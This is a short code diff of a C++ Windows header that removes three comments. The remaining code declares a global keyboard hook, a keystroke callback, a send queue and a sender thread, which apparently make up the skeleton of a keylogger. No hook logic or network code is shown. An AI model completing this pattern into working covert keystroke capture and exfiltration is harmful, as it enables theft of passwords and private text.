@@ -11,7 +11,6 @@
 
 #define MAX_BUFFER 10
 
-// Global variables
 inline LPCWSTR     MUTEX_NAME        = L"e3a8bdf7-1c29-4f7b-a0d2-c3f5e9b08a14";
 inline HHOOK       _k_hook           = nullptr;
 inline HKL         keyboardLayout    = nullptr;
@@ -24,8 +23,6 @@ inline std::queue<std::string> sendQueue;
 inline std::mutex queueMutex;
 inline bool shouldStopSender = false;
 
-// Keyboard hook callback
 LRESULT __stdcall process_key(int nCode, WPARAM wParam, LPARAM lParam);
 
-// Sender thread function
 DWORD WINAPI senderThread(LPVOID lpParam);
